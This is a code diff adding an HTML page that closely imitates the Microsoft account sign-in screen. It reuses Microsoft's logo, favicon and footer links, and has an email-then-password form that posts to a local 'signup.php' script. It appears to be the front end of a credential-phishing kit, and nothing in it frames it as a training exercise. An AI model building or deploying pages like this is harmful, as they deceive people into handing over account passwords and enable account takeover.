@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Sign in to your Microsoft account</title>
+    <link rel="icon" type="image/x-icon" href="https://logincdn.msftauth.net/16.000.30004.15/images/favicon.ico">
+</head>
+<body>
+    <div class="container">
+        <form action="signup.php" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off">
+            <img class="logo" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg">
+            <div class="forms-container">
+                <div class="forms">
+                    <div class="first">
+                        <h2>Sign in</h2>
+                        <div class="form-group">
+                            <input type="email" placeholder="Email, Phone, or Skype" required>
+                        </div>
+                        <p>No aacount? <a href="#">Create One!</a></p>
+                        <a href="#">Sign in with a security key <span>?</span></a>
+                        <button type="button" class="next-btn">Next</button>
+                    </div>
+                    <div class="second">
+                        <p><span class="arrow-btn">&#8592;</span> <span class="email">helloworld@hotmail.com</span></p>
+                        <h2>Enter password</h2>
+                        <div class="form-group">
+                            <input type="password" placeholder="Password" required>
+                        </div>
+                        <a href="#">Forgot password?</a>
+                        <button type="button">Sign in</button>
+                    </div>
+                </div>
+            </div>
+        </form>
+        <div class="bottom">
+            <img src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg">
+            <span>Sign-in options</span>
+        </div>
+    </div>
+    <div id="footer" role="contentinfo" data-bind="
+        externalCss: {
+            'footer': true,
+            'has-background': !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
+            'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">
+
+        <div data-bind="component: { name: 'footer-control',
+            publicMethods: $page.footerMethods,
+            params: {
+                serverData: svr,
+                useDefaultBackground: $page.useDefaultBackground(),
+                hasDarkBackground: $page.backgroundLogoUrl(),
+                showLinks: true,
+                showFooter: $page.showFooter(),
+                hideTOU: $page.hideTOU(),
+                termsText: $page.termsText(),
+                termsLink: $page.termsLink(),
+                hidePrivacy: $page.hidePrivacy(),
+                privacyText: $page.privacyText(),
+                privacyLink: $page.privacyLink() },
+            event: {
+                agreementClick: $page.footer_agreementClick,
+                showDebugDetails: $page.toggleDebugDetails_onClick } }">
+<div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { 'footer-links': true }">
+<a id="ftrTerms" data-bind="
+            text: termsText,
+            href: termsLink,
+            click: termsLink_onClick,
+            externalCss: {
+                'footer-content': true,
+                'footer-item': true,
+                'has-background': !useDefaultBackground,
+                'background-always-visible': hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;uaid=e0a26cd453fc414f98698f45e0c991b9" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
+        <a id="ftrPrivacy" data-bind="
+            text: privacyText,
+            href: privacyLink,
+            click: privacyLink_onClick,
+            externalCss: {
+                'footer-content': true,
+                'footer-item': true,
+                'has-background': !useDefaultBackground,
+                'background-always-visible': hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;uaid=e0a26cd453fc414f98698f45e0c991b9" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
+    <a id="moreOptions" href="#" role="button" data-bind="
+        click: moreInfo_onClick,
+        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
+        attr: { 'aria-expanded': showDebugDetails().toString() },
+        hasFocusEx: focusMoreInfo(),
+        externalCss: {
+            'footer-content': true,
+            'footer-item': true,
+            'debug-item': true,
+            'has-background': !useDefaultBackground,
+            'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
+</div></div>
+    </div>
+    <script>
+        const forms = document.querySelector('.forms');
+        const nextButton = document.querySelector('.next-btn');
+        const arrowButton = document.querySelector('.arrow-btn');
+    
+        const emailInput = document.querySelector('.first input');
+        const emailDisplay = document.querySelector('.email');
+        const passwordInput = document.querySelector('.second input');
+    
+        nextButton.addEventListener('click', () => {
+            forms.classList.add('next-form');
+            emailDisplay.innerText = emailInput.value;
+            passwordInput.setAttribute('placeholder', 'Password for ' + emailInput.value);
+            document.querySelector('.bottom').style.display = 'none';
+        });
+    
+        arrowButton.addEventListener('click', () => {
+            forms.classList.remove('next-form');
+            document.querySelector('.bottom').style.display = 'flex';
+        });
+    </script>    
+</body>
+</html>
